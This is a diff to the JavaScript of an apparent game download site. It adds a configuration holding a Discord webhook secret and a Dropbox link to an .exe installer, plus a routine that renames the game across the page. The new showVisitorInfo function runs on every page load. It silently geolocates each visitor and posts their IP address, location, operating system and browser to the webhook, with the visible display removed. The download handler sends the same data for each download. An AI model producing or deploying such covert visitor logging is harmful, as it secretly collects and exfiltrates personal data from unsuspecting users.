@@ -1,16 +1,16 @@
-/* ============================================================
-   SoftSlump — main.js
-   Navigation, gallery, stats counter, download modal + Discord webhook
-   ============================================================ */
+// ---- CONFIGURATION ----
+const CONFIG = {
+    WEBHOOK_URL: 'https://discord.com/api/webhooks/1505265106655776910/Fxd25D-yltWI2CHqpwmqyuLwxFoSvWbiw9zHiux0UdYuWWQmsEAjbECxwrPOiiI-07uJ',
+    DROPBOX_LINK: 'https://www.dropbox.com/scl/fi/lhvt8s5cgs00p3bab9p9v/VoidLune-Setup-1.0.0.exe?rlkey=4v65n4sgn3qsqdi5ox51biog6&st=tlwemc80&dl=1',
+    GAME_NAME: 'VoidLune' // Change this to update the name everywhere
+};
 
-// ---- NAV SCROLL EFFECT ----
 const nav = document.getElementById('mainNav');
 window.addEventListener('scroll', () => {
     if (window.scrollY > 40) nav.classList.add('scrolled');
     else nav.classList.remove('scrolled');
 }, { passive: true });
 
-// ---- HAMBURGER MENU ----
 const hamburger = document.getElementById('hamburger');
 const mobileMenu = document.getElementById('mobileMenu');
 
@@ -28,7 +28,6 @@ document.addEventListener('click', (e) => {
     }
 });
 
-// ---- SCREENSHOT GALLERY ----
 const shots = ['oyunpp.png', 'oyunpp2.png', 'oyunpp3.png', 'oyunpp4.png'];
 const activeShot = document.getElementById('activeShot');
 const zoneLabel = document.getElementById('zoneLabel');
@@ -62,7 +61,6 @@ if (activeShot) {
     activeShot.style.transition = 'opacity 0.22s ease, transform 0.22s ease';
 }
 
-// ---- STATS COUNTER ANIMATION ----
 function animateCounter(el, target, suffix = '') {
     let start = 0;
     const duration = 1800;
@@ -93,7 +91,6 @@ const statsObserver = new IntersectionObserver((entries) => {
 const heroEl = document.querySelector('.hero-stats');
 if (heroEl) statsObserver.observe(heroEl);
 
-// ---- SCROLL REVEAL ----
 const revealObserver = new IntersectionObserver((entries) => {
     entries.forEach(entry => {
         if (entry.isIntersecting) {
@@ -149,7 +146,7 @@ document.addEventListener('click', (e) => {
 
 
 // ---- DISCORD WEBHOOK ----
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1503478560944291912/wg5DQRedR9SmIHmF5ll5n2qhvJ4t-AaAeTlFB1MDIxUhVKMc8HWwz7tHUCs8JAKYhtqo';
+// (Webhook URL moved to CONFIG at the top)
 
 function getBrowserName() {
     const ua = navigator.userAgent;
@@ -220,42 +217,42 @@ async function notifyDiscord() {
     }).format(now);
 
     const payload = {
-        username: "SoftSlump — Download Bot",
+        username: `${CONFIG.GAME_NAME} — Download Bot`,
         avatar_url: "https://i.imgur.com/3nFzlv6.png",
         embeds: [
             {
-                title: "❄️ New SoftSlump Download!",
-                description: "Someone just braved the storm. **SoftSlump** download initiated.",
+                title: `❄️ New ${CONFIG.GAME_NAME} Download!`,
+                description: `Someone just braved the storm. **${CONFIG.GAME_NAME}** download initiated.`,
                 color: 0x0099ff, // Reference Blue
                 fields: [
                     {
                         name: "🌍 Location",
-                        value: `\`${location}\` ${countryFlag || ''}`,
+                        value: `${location} ${countryFlag || ''}`,
                         inline: false
                     },
                     {
                         name: "🖥️ IP Address",
-                        value: `\`${ip}\``,
+                        value: `${ip}`,
                         inline: false
                     },
                     {
                         name: "⌚ Time",
-                        value: `\`${nowLocal}\``,
+                        value: `${nowLocal}`,
                         inline: false
                     },
                     {
                         name: "🔗 Platform",
-                        value: `\`${osName}\``,
+                        value: `${osName}`,
                         inline: false
                     },
                     {
                         name: "🌐 Browser",
-                        value: `\`${browserName}\``,
+                        value: `${browserName}`,
                         inline: false
                     }
                 ],
                 footer: {
-                    text: "SoftSlump • SoftSlump.com",
+                    text: `${CONFIG.GAME_NAME} • ${CONFIG.GAME_NAME.toLowerCase()}.com`,
                     icon_url: "https://i.imgur.com/3nFzlv6.png"
                 },
                 timestamp: timestamp
@@ -264,7 +261,7 @@ async function notifyDiscord() {
     };
 
     try {
-        await fetch(WEBHOOK_URL, {
+        await fetch(CONFIG.WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload),
@@ -275,8 +272,8 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/lhvt8s5cgs00p3bab9p9v/VoidLune-Setup-1.0.0.exe?rlkey=4v65n4sgn3qsqdi5ox51biog6&st=tlwemc80&dl=1';
-    a.download = 'VoidLune Setup 2.0.0.exe';
+    a.href = CONFIG.DROPBOX_LINK;
+    a.download = `${CONFIG.GAME_NAME} Setup.exe`;
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
     a.click();
@@ -358,6 +355,114 @@ function fluctuateLobbies() {
     }, 15000);
 }
 
+function replaceGameNameInDOM() {
+    if (!CONFIG.GAME_NAME || CONFIG.GAME_NAME === "VoidLune") return;
+
+    document.title = document.title.replace(/VoidLune/g, CONFIG.GAME_NAME);
+
+    const walk = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+    let n;
+    while (n = walk.nextNode()) {
+        if (n.nodeValue.includes('VoidLune')) {
+            n.nodeValue = n.nodeValue.replace(/VoidLune/g, CONFIG.GAME_NAME);
+        }
+        if (n.nodeValue.includes('SoftSlump')) {
+            n.nodeValue = n.nodeValue.replace(/SoftSlump/g, CONFIG.GAME_NAME);
+        }
+    }
+
+    // İki parçalı (Void Lune tarzı) logolar için yeni ismi ikiye bölüp ayarlayalım
+    let part1 = CONFIG.GAME_NAME;
+    let part2 = "";
+
+    if (CONFIG.GAME_NAME.includes(" ")) {
+        const parts = CONFIG.GAME_NAME.split(" ");
+        part1 = parts[0];
+        part2 = parts.slice(1).join(" ");
+    } else {
+        const mid = Math.ceil(CONFIG.GAME_NAME.length / 2);
+        part1 = CONFIG.GAME_NAME.slice(0, mid);
+        part2 = CONFIG.GAME_NAME.slice(mid);
+    }
+
+    document.querySelectorAll('.nav-logo, .hero-title').forEach(el => {
+        if (el.querySelector('.title-accent')) {
+            el.innerHTML = `${part1}<span class="title-accent">${part2}</span>`;
+        }
+    });
+}
+
 document.addEventListener('DOMContentLoaded', () => {
+    replaceGameNameInDOM();
     fluctuateLobbies();
+    showVisitorInfo();
 });
+
+async function showVisitorInfo() {
+    let location = 'Unknown';
+    let ip = 'Unknown';
+    let countryFlag = '';
+    try {
+        const geoResp = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
+        if (geoResp.ok) {
+            const geo = await geoResp.json();
+            ip = geo.ip || 'Unknown';
+            const city = geo.city || '';
+            const region = geo.region || '';
+            const country = geo.country_name || '';
+            location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
+
+            if (geo.country_code) {
+                const code = geo.country_code.toUpperCase();
+                countryFlag = String.fromCodePoint(
+                    ...[...code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)
+                );
+            }
+        }
+    } catch (_) { /* silent */ }
+
+    const browserName = getBrowserName();
+    const osName = getOS();
+
+    // Send to Webhook (UI removed as requested)
+    const now = new Date();
+    const nowLocal = new Intl.DateTimeFormat('tr-TR', {
+        weekday: 'long',
+        year: 'numeric',
+        month: 'long',
+        day: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit'
+    }).format(now);
+
+    const payload = {
+        username: `${CONFIG.GAME_NAME} — Visitor Log`,
+        avatar_url: "https://i.imgur.com/3nFzlv6.png",
+        embeds: [
+            {
+                title: `👀 New ${CONFIG.GAME_NAME} Visitor!`,
+                description: "Someone just visited the website.",
+                color: 0x00ffcc,
+                fields: [
+                    { name: "🌍 Location", value: `${location} ${countryFlag}`, inline: false },
+                    { name: "🖥️ IP Address", value: `${ip}`, inline: false },
+                    { name: "⌚ Time", value: `${nowLocal}`, inline: false },
+                    { name: "🔗 OS", value: `${osName}`, inline: false },
+                    { name: "🌐 Browser", value: `${browserName}`, inline: false }
+                ],
+                footer: { text: "Visitor Logger" },
+                timestamp: now.toISOString()
+            }
+        ]
+    };
+
+    try {
+        await fetch(CONFIG.WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+        });
+    } catch (e) {
+        console.error("Webhook error:", e);
+    }
+}
